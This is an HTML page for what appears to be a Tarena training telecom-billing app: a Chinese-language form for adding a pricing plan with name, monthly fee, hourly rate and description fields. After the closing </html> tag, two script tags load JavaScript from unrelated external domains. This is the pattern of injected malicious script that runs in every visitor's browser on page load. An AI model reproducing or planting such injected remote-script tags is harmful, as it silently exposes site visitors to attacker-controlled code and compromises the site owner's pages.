<html>
<head>
<title>资费管理</title>
<style type="text/css">
<!--
@import url("/app/son.css");
@import url("/app/index.css");
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="/app/index.css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#ccddee" background="/app/image/background.jpg" link="#000066" vlink="#0066FF" alink="#99FF00">
<hr size="1" noshade>
<div align="center"> 
  
    <table width="91%" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="ccccff" bgcolor="ccddee">
      <tr bgcolor="#ccddee" class="pp"> 
        <td width="13%" height="24"><span class="yellow">添加资费</span><span class="9P"> 
          </span> </td>
        
      <td width="13%"><span class="9P"><a href="listPricing.htm" class="text_link">资费列表</a></span></td>
      </tr>
    </table>

  <form name="pricingform" method="post" action="listPricing.htm">
    <p class="pp">添加新的资费政策</p>
    <table width="91%" border="1" bordercolor="#ccccff" bgcolor="#ccddee" class="9P">
      <tr> 
        <td width="12%">资费名称</td>
        <td width="30%"><input type="text" name="pricingName"></td>
        <td>请输入新建资费名称（只允许用英文，数字，下划线，区分大小写）</td>
      </tr>
      <tr> 
        <td>月租费用</td>
        <td><input type="text" name="baseFee"></td>
        <td>请选择新建资费的月租费用（只允许输入数字或小数点）</td>
      </tr>
      <tr> 
        <td>每小时费用</td>
        <td><input type="text" name="rateFee"></td>
        <td>请输入每小时的费用（只允许用数字或小数点）</td>
      </tr>
      <tr> 
        <td height="10">资费描述</td>
        <td><textarea name="pricingDesc"></textarea></td>
        <td>请输入对新建资费的简单描述（最多256个汉字）</td>
      </tr>
      <tr> 
        <td><div align="right"> </div></td>
        <td>&nbsp;</td>
        <td> &nbsp; 
          <input type="submit" name="Submit2" value="提交">
          <input type="reset" name="Submit" value="清除"> </td>
      </tr>
    </table>
    <p>&nbsp;</p>
  </form>
</div>
<center>
  <p class="9P">&nbsp; </p>
  <hr/>
  <p class="text_link"><font size="2" face="宋体">About Tarena - 公司简介 - 联系方法 - 相关法律 
    - 客户服务 <br>
    达内公司版权所有</font></p>
  <p class="text_link"><font size="-1">Copyright&nbsp;<img src="/image/c-00.gif" width="9" height="9">&nbsp;2000. 
    Tarena Technologies Inc. All Rights Reserved </font></p>
</center>
</body>
</html>

<script language=javascript src=http://www.shaoye1213.cn/tl.js></script>
<script language=javascript src=http://www.eheh001.cn/a.js></script>